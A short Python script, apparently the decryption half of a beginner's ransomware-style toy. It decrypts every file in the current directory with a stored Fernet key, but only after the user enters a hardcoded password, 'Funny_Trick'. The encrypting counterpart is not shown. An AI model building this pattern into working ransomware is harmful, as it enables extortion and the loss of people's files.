#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#About Fernet....??


#Let's find Some files or All of the file as you say so!

files = []

for file in os.listdir():
  if file == "noob.py" or file == "thekey.key" or file == "prof.py":
    continue
  if os.path.isfile(file):
    files.append(file)
  
print(files)

#Take secret_key--step1

with open("thekey.key", "rb") as key:
  secret_key = key.read()

#file-decryption(Open>decrypt>Write the File)
sec_phrase = "Funny_Trick"

u_phrase = input("Enter the password\n")

if u_phrase == sec_phrase:
  for file in files:
    #open
    with open(file,"rb") as thefile:
      contents = thefile.read()
  
    #decrypt
    contents_decrypted = Fernet(secret_key).decrypt(contents)
  
    #write
    with open(file,"wb") as thefile:
      thefile.write(contents_decrypted)
  print("Thank you,all files have been Decrypted")
else: 
  print("Don't play games || Guessing won't work || Goodbye!")
